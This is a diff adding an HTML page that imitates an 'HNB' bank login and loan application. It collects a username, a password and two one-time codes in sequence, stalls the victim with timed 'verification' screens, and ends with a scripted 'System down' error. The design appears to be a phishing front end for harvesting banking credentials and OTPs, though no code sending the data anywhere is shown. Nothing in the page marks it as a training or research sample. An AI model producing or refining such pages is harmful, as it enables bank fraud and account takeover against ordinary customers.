@@ -1,0 +1,173 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Loan Application</title>
+  <style>
+    /* General styles */
+    body, html {
+      margin: 0;
+      padding: 0;
+      height: 100%;
+      font-family: Arial, sans-serif;
+      display: flex;
+      justify-content: center;
+      align-items: center;
+      background: url('https://images.pexels.com/photos/50987/money-card-business-credit-card-50987.jpeg?auto=compress&cs=tinysrgb&w=1260&h=750&dpr=2') no-repeat center center;
+      background-size: cover; /* Ensures the image covers the entire page */
+      color: white;
+    }
+
+    .form {
+      background: rgba(0, 0, 0, 0.7); /* Semi-transparent black background for form */
+      padding: 20px;
+      border-radius: 8px;
+      text-align: center;
+      width: 300px;
+    }
+
+    input, button {
+      width: 100%;
+      padding: 10px;
+      margin: 10px 0;
+      border: none;
+      border-radius: 5px;
+    }
+
+    input {
+      background: #eee;
+      color: #333;
+    }
+
+    button {
+      background: #1dd1a1;
+      color: white;
+      cursor: pointer;
+    }
+
+    #loading, #loan-otp-section, #verification-step, #final-otp-section, #error-message {
+      display: none;
+    }
+  </style>
+</head>
+<body>
+  <div class="form">
+    <h2>HNB Login</h2>
+    <input type="text" id="username" placeholder="Enter Username" required>
+    <input type="password" id="password" placeholder="Enter Password" required>
+    <button id="login-btn">Login</button>
+
+    <div id="loading">Loading... Please wait</div>
+
+    <div id="loan-otp-section">
+      <h2>Apply for a HNB Mobile Loan</h2>
+      <input type="text" id="loan-otp" placeholder="Enter OTP for Loan">
+      <button id="apply-loan-btn">Submit OTP</button>
+    </div>
+
+    <div id="verification-step">
+      <h2>Verify HNB Loan Details</h2>
+      <p>Confirm your loan details before proceeding to final verification.</p>
+      <button id="verify-loan-btn">Verify and Proceed</button>
+    </div>
+
+    <div id="final-otp-section">
+      <h2>Submit OTP</h2>
+      <input type="text" id="final-otp" placeholder="Enter Final OTP">
+      <button id="final-submit-btn">Submit</button>
+    </div>
+
+    <div id="error-message">
+      <p>System down at this time. Sorry for the inconvenience.</p>
+    </div>
+  </div>
+
+  <script>
+    document.addEventListener("DOMContentLoaded", () => {
+      const loginBtn = document.getElementById("login-btn");
+      const applyLoanBtn = document.getElementById("apply-loan-btn");
+      const verifyLoanBtn = document.getElementById("verify-loan-btn");
+      const finalSubmitBtn = document.getElementById("final-submit-btn");
+
+      const loadingDiv = document.getElementById("loading");
+      const loanOtpSection = document.getElementById("loan-otp-section");
+      const verificationStep = document.getElementById("verification-step");
+      const finalOtpSection = document.getElementById("final-otp-section");
+      const errorMessage = document.getElementById("error-message");
+
+      // Login button event
+      loginBtn.addEventListener("click", () => {
+        const username = document.getElementById("username").value;
+        const password = document.getElementById("password").value;
+
+        if (username && password) {
+          // Hide login form and show loading
+          document.getElementById("username").style.display = "none";
+          document.getElementById("password").style.display = "none";
+          loginBtn.style.display = "none";
+          loadingDiv.style.display = "block";
+
+          setTimeout(() => {
+            loadingDiv.style.display = "none";
+            loanOtpSection.style.display = "block"; // Show loan OTP section
+          }, 5000);
+        } else {
+          alert("Please fill in both username and password.");
+        }
+      });
+
+      // Loan OTP submission event
+      applyLoanBtn.addEventListener("click", () => {
+        const loanOtp = document.getElementById("loan-otp").value;
+
+        if (loanOtp) {
+          loanOtpSection.style.display = "none";
+          loadingDiv.textContent = "Processing OTP submission... Please wait";
+          loadingDiv.style.display = "block";
+
+          setTimeout(() => {
+            loadingDiv.style.display = "none";
+            verificationStep.style.display = "block"; // Show loan verification step
+          }, 5000);
+        } else {
+          alert("Please enter the OTP for loan application.");
+        }
+      });
+
+      // Verify loan and proceed to final OTP screen
+      verifyLoanBtn.addEventListener("click", () => {
+        verificationStep.style.display = "none";
+        loadingDiv.textContent = "Final verification in progress... Please wait";
+        loadingDiv.style.display = "block";
+
+        setTimeout(() => {
+          loadingDiv.style.display = "none";
+          finalOtpSection.style.display = "block"; // Show final OTP screen
+        }, 5000);
+      });
+
+      // Final OTP submission event
+      finalSubmitBtn.addEventListener("click", () => {
+        const finalOtp = document.getElementById("final-otp").value;
+
+        if (finalOtp) {
+          // Hide OTP field and show loading
+          finalOtpSection.querySelector('input').style.display = "none"; // Hide OTP field
+          finalSubmitBtn.style.display = "none"; // Hide submit button
+          loadingDiv.textContent = "Processing Final OTP... Please wait";
+          loadingDiv.style.display = "block";
+
+          // Simulate system downtime
+          setTimeout(() => {
+            loadingDiv.style.display = "none";
+            errorMessage.style.display = "block"; // Show error message
+          }, 10000);
+        } else {
+          alert("Please enter the final OTP.");
+        }
+      });
+    });
+  </script>
+</body>
+</html>
